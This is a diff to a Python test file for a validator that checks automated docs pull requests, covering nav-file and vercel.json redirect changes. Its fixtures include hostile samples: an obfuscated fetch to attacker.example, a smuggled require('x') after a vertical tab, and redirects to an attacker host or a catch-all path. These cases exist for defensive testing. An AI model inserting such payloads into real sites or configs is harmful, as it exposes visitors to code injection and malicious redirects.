@@ -72,11 +72,26 @@ VERCEL_BASE = {
     "headers": [{"source": "/(.*)", "headers": [{"key": "X-Frame-Options", "value": "DENY"}]}],
     "redirects": [],
 }
+EXISTING_REDIRECTS = [
+    {"source": "/docs/:path*", "destination": "/docs"},
+    {"source": "/docs/session-replay", "destination": "/docs/session-replay/retention"},
+]
+UNRELATED_DOCS_NAV_HUNK = (
+    "@@ -40,1 +40,2 @@\n+  { name: 'Retention presets', url: '/docs/session-replay/retention-presets' },"
+    "\n-  { name: 'Retention', url: '/docs/session-replay/retention' },"
+    "\n+  { name: 'Retention', url: '/docs/session-replay/sharing' },"
+)
 NEW_PAGE_REDIRECT = {"source": "/docs/session-replay/presets", "destination": "/docs/session-replay/retention-presets"}
 
 
-def _vercel_edit(head_config: dict) -> dict:
-    return {"filename": "vercel.json", "status": "modified", "patch": "@@ -1 +1 @@\n+redirect", "head": head_config}
+def _vercel_edit(head_config: dict, base_config: dict = VERCEL_BASE) -> dict:
+    return {
+        "filename": "vercel.json",
+        "status": "modified",
+        "patch": "@@ -1 +1 @@\n+redirect",
+        "head": head_config,
+        "base": base_config,
+    }
 
 
 REPOSITORY_SOURCED_PAGE = "https://posthog.com/docs/logs/logql-api"
@@ -149,9 +164,9 @@ def _changed_on_branch(*changed_files: str | dict, status_code: int = 200) -> Ca
 
     def respond(method, path, **kwargs):
         if "/contents/" in path:
-            head = next((changed["head"] for changed in listed if "head" in changed), None)
+            vercel_edit = next((changed for changed in listed if "head" in changed), {})
             is_base = kwargs["params"]["ref"] == "b" * 40
-            config = VERCEL_BASE if is_base or head is None else head
+            config = vercel_edit.get("base", VERCEL_BASE) if is_base or not vercel_edit else vercel_edit["head"]
             return MagicMock(status_code=200, text=json.dumps(config))
         compared = {
             "ahead_by": 1,
@@ -382,6 +397,23 @@ def test_a_finished_writer_run_opens_one_linked_docs_pull_request_and_a_same_sec
         (
             (
                 {"filename": NEW_PAGE_PATH, "status": "added"},
+                {**NAV_ENTRY_FOR_NEW_PAGE, "patch": UNRELATED_DOCS_NAV_HUNK},
+            ),
+            "changed_paths_outside_docs",
+        ),
+        (
+            (
+                {"filename": NEW_PAGE_PATH, "status": "added"},
+                _vercel_edit(
+                    {**VERCEL_BASE, "redirects": [*reversed(EXISTING_REDIRECTS), NEW_PAGE_REDIRECT]},
+                    {**VERCEL_BASE, "redirects": EXISTING_REDIRECTS},
+                ),
+            ),
+            "changed_paths_outside_docs",
+        ),
+        (
+            (
+                {"filename": NEW_PAGE_PATH, "status": "added"},
                 _vercel_edit({"headers": [], "redirects": [NEW_PAGE_REDIRECT]}),
             ),
             "changed_paths_outside_docs",
@@ -397,6 +429,7 @@ def test_a_finished_writer_run_opens_one_linked_docs_pull_request_and_a_same_sec
             for line in (
                 "  []['filter']['constructor']('fetch(\\'//attacker.example\\')')(),",
                 "  { name: 'Retention presets', url: ('//attacker.example') },",
+                "  { name: 'Retention presets', url: '/docs/session-replay/retention-presets' },\x0brequire('x')",
             )
         ),
         *(
@@ -410,6 +443,7 @@ def test_a_finished_writer_run_opens_one_linked_docs_pull_request_and_a_same_sec
             for redirect in (
                 {**NEW_PAGE_REDIRECT, "source": "/(.*)"},
                 {"source": NEW_PAGE_REDIRECT["destination"], "destination": "/\\attacker.example"},
+                {"source": f"{NEW_PAGE_REDIRECT['destination']}(.*)", "destination": NEW_PAGE_REDIRECT["source"]},
             )
         ),
         (
